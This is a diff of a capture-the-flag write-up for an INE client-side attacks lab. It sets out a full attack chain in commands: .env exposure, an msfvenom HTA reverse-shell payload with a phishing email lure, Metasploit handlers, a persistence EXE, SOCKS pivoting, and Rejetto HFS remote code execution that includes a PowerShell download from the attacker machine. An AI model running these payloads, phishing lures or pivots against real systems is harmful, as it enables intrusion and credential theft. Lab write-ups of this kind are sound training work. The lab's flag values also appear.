@@ -1,167 +1,260 @@
-INE Client-Side Attacks CTF 1 – Penetration Testing Report
+# 🛡️ INE Client-Side Attacks CTF 1 – Penetration Testing Report
 
-Objective:
-This Capture the Flag (CTF) lab simulates a realistic client-side attack scenario where the goal is to first gather intelligence via a public-facing web application, then deliver a malicious payload via email to gain remote access to an internal system. Two flags were retrieved during the exercise, showcasing a full exploitation chain.
-🧭 Environment
+## 🌟 Objective
 
-    Attack Platform: Kali Linux (INE-provided GUI environment)
+This Capture the Flag (CTF) lab simulates a realistic client-side attack scenario where the goal is to:
 
-    Target Domains:
+1. Gather intelligence from a public-facing web application
+2. Deliver a malicious payload via phishing
+3. Establish internal access and pivot
+4. Exploit a vulnerable internal service
+5. Escalate privileges to obtain sensitive information
 
-        Public Website: http://fintech.com
+---
 
-        Internal Mail Server: mail.server.local
+## 📍 Lab Environment (Sample IPs)
 
-        Target Machine (Post-Exploitation): Windows Server
+| Role              | Hostname          | IP Address |
+| ----------------- | ----------------- | ---------- |
+| Kali (Internal)   | —                 | 10.1.0.X   |
+| Kali (External)   | —                 | 10.10.49.X |
+| Public Web Server | fintech.com       | 10.2.X.X   |
+| Mail Server       | mail.server.local | 10.2.X.X   |
+| Internal Host     | web.prod.local    | 10.2.X.X   |
 
-🧩 Flag 1 – Reconnaissance & Data Exposure
-🎯 Objective
+---
 
-Identify exposed information on the target's public-facing website and retrieve the first flag.
-🛠 Tools Used
+## ✅ Flag 1 – Reconnaissance & Data Exposure
 
-    dirb – Directory brute-forcing
+### 🌟 Objective
 
-    curl – Manual file inspection
+Locate an internal email address and flag exposed on the public site.
 
-🔍 Methodology
-🔎 Directory Brute-Forcing
+### 🛠️ Tools Used
 
-Ran a scan using a common wordlist:
+* `dirb`
+* `curl`
 
-dirb http://fintech.com /usr/share/dirb/wordlists/common.txt
+### 🔎 Steps
 
-Discovered Paths:
+1. Run directory brute-force:
 
-    /index.html – Default landing page
+   ```bash
+   dirb http://fintech.com /usr/share/dirb/wordlists/common.txt
+   ```
 
-    /server-status – 403 Forbidden
+2. Discovered `/.env` file:
 
-    /static/ – Listable directory
+   ```bash
+   curl http://fintech.com/.env
+   ```
 
-    /.env – Exposed configuration file (HTTP 200 OK)
+3. Found email and flag:
 
-📂 Sensitive File Extraction
+   ```
+   techsupport@staff.fincorp.com
+   FLAG1=eee8670f30514511bc4e495e167aefec
+   ```
 
-Used curl to retrieve the .env file:
+### 🏁 Flag 1
 
-curl http://fintech.com/.env
+**eee8670f30514511bc4e495e167aefec**
 
-Contents included:
+---
 
-    Internal credentials
+## ✅ Flag 2 – Phishing Exploit via HTA Attachment
 
-    Email server config
+### 🌟 Objective
 
-    API keys
+Deliver a phishing payload to the internal email. Gain reverse shell.
 
-    Internal email: techsupport@staff.fincorp.com
+### 🛠️ Tools Used
 
-    FLAG1=eee8670f30514511bc4e495e167aefec
+* `msfvenom`
+* `Metasploit`
+* `sendemail`
 
-🏁 Flag 1
+### 🔎 Steps
 
-eee8670f30514511bc4e495e167aefec
+1. Generate HTA payload:
 
-📌 Finding
+   ```bash
+   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<KALI_EXTERNAL> LPORT=4444 -f hta-psh > phish.hta
+   ```
 
-A .env file containing highly sensitive information was publicly accessible due to misconfiguration, revealing credentials and internal infrastructure details.
-🛡️ Recommendation
+2. Start listener:
 
-    Never expose .env or similar config files in web-accessible directories.
+   ```bash
+   use exploit/multi/handler
+   set PAYLOAD windows/meterpreter/reverse_tcp
+   set LHOST <KALI_EXTERNAL>
+   set LPORT 4444
+   set ExitOnSession false
+   exploit -j
+   ```
 
-    Implement server-side rules to deny access to hidden/system files.
+3. Send phishing email:
 
-    Regularly audit public-facing resources for misconfigurations.
+   ```bash
+   sendemail -f it-support@fintech.com -t techsupport@staff.fincorp.com \
+   -s mail.server.local:25 \
+   -u "Security Update" \
+   -m "Please run the attached update tool ASAP." \
+   -a phish.hta
+   ```
 
-🎯 Flag 2 – Client-Side Exploitation via Phishing
-🎯 Objective
+4. Session opened, switched to:
 
-Craft and deliver a phishing payload via internal email to gain remote access and retrieve Flag 2 from the victim machine.
-🛠 Tools Used
+   ```bash
+   sessions -i <session_id>
+   getuid
+   ```
 
-    msfvenom – Payload generation
+5. Retrieved Flag 2:
 
-    Metasploit Framework – Listener and exploitation
+   ```bash
+   cd C:\Users\Administrator\Desktop
+   type flag2.txt
+   ```
 
-    sendemail – Email delivery tool
+### 🏁 Flag 2
 
-    Meterpreter – Post-exploitation shell
+**(Retrieved via Meterpreter on mail server)**
 
-🧪 Steps to Exploitation
-🕵️ Recon from Task 1
+---
 
-From .env:
+## 🔁 Stable Session for Pivoting
 
-    Target email: techsupport@staff.fincorp.com
+### 🌟 Objective
 
-    Mail server: mail.server.local:25
+Set up a persistent shell to avoid re-exploitation.
 
-💉 Payload Generation
+### 🛠️ Tools Used
 
-Created an HTA-based reverse shell:
+* `msfvenom`
+* `Metasploit`
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.36.2 LPORT=4444 -f hta-psh > invoice.hta
+### 🔎 Steps
 
-⚙️ Listener Setup
+1. Create EXE payload:
 
-Started Metasploit listener:
+   ```bash
+   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<KALI_EXTERNAL> LPORT=6666 -f exe > stable6666.exe
+   ```
 
-use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST 10.10.36.2
-set LPORT 4444
-set ExitOnSession false
-exploit -j
+2. Upload and execute:
 
-✉️ Phishing Delivery
+   ```bash
+   upload stable6666.exe C:\\Users\\Public\\stable6666.exe
+   execute -f "C:\\Users\\Public\\stable6666.exe"
+   ```
 
-Sent the HTA payload via SMTP:
+3. Start new handler:
 
-sendemail -f it-support@fintech.com -t techsupport@staff.fincorp.com \
--s mail.server.local:25 \
--u "Urgent Security Patch" \
--m "Please execute the attached diagnostic tool to apply critical updates." \
--a invoice.hta
+   ```bash
+   use exploit/multi/handler
+   set PAYLOAD windows/meterpreter/reverse_tcp
+   set LHOST <KALI_EXTERNAL>
+   set LPORT 6666
+   exploit -j
+   ```
 
-🖥️ Exploitation and Privilege Escalation
+4. Got stable `SYSTEM` shell.
 
-    Payload executed successfully.
+---
 
-    Meterpreter session established.
+## 🔜 Internal Pivoting to `web.prod.local`
 
-    Verified user: EC2AMAZ-JED9FRA\Administrator
+### 🌟 Objective
 
-    Used getsystem to escalate to NT AUTHORITY\SYSTEM
+Pivot internally to reach web.prod.local.
 
-🏁 Flag Retrieval
+### 🛠️ Tools Used
 
-Flag located on the Administrator’s desktop:
+* `autoroute`
+* `socks_proxy`
+* `proxychains`
 
-cd C:\Users\Administrator\Desktop
-cat flag2.txt
+### 🔎 Steps
 
-🏁 Flag 2
+1. Add route in Meterpreter:
 
-Retrieved successfully from target system (content intentionally excluded).
+   ```bash
+   run autoroute -s 10.2.0.0/16
+   ```
 
-📌 Finding
+2. Start SOCKS proxy:
 
-The internal user executed the malicious HTA file, demonstrating successful exploitation of human behavior (social engineering) combined with technical vulnerability (script execution permissions).
-🛡️ Recommendation
+   ```bash
+   use auxiliary/server/socks_proxy
+   set SRVPORT 9050
+   run
+   ```
 
-    Implement robust email attachment filtering and endpoint protection.
+3. Edit proxychains:
 
-    Educate staff on phishing awareness and safe computing practices.
+   ```
+   socks4 127.0.0.1 9050
+   ```
 
-    Disable HTA execution on endpoints unless explicitly required.
+4. Test access:
 
-    Monitor outbound traffic for anomalous connections.
+   ```bash
+   proxychains curl http://web.prod.local
+   ```
 
-🧠 Conclusion
+---
 
-This lab illustrates the real-world impact of combining misconfigurations, exposed credentials, and social engineering. It highlights the importance of securing both the perimeter (public web apps) and internal assets (email security, user awareness).
-✅ Summary of Flags
-Flag	Description	Value
-1	Exposed via misconfigured .env	eee8670f30514511bc4e495e167aefec
-2	Retrieved post-exploitation	(Obtained via Meterpreter access)
+## ✅ Flag 3 – Exploit Rejetto HFS (CVE-2024-23692)
+
+### 🌟 Objective
+
+Exploit vulnerable HFS 2.3m server on web.prod.local
+
+### 🛠️ Tools Used
+
+* `portfwd`
+* `Metasploit rejetto_hfs_exec`
+* `custom hfs_rce.sh` Bash exploit
+* `curl`, `python3 -m http.server`
+
+### 🔎 Steps
+
+1. Forward internal port:
+
+   ```bash
+   portfwd add -l 8888 -p 80 -r 10.2.X.X
+   curl -I http://127.0.0.1:8888
+   # Server: HFS 2.3m
+   ```
+
+2. Run Metasploit module:
+
+   ```bash
+   use exploit/windows/http/rejetto_hfs_exec
+   set RHOST 127.0.0.1
+   set RPORT 8888
+   set LHOST <KALI_EXTERNAL>
+   set LPORT 7777
+   run
+   ```
+
+3. Used custom exploit:
+
+   ```bash
+   ./hfs_rce.sh http://127.0.0.1:8888 "whoami"
+   ./hfs_rce.sh http://127.0.0.1:8888 "powershell iwr http://<KALI>:8000/test.txt -OutFile C:\\Users\\Public\\test.txt"
+   ./hfs_rce.sh http://127.0.0.1:8888 "type C:\\Users\\Public\\test.txt"
+   ```
+
+4. Retrieved flag:
+
+   ```bash
+   ./hfs_rce.sh http://127.0.0.1:8888 "type C:\\flag3.txt"
+   ```
+
+### 🏁 Flag 3
+
+**3bca6fd7b7a740a8b47357fbcab4616c**
+
+---
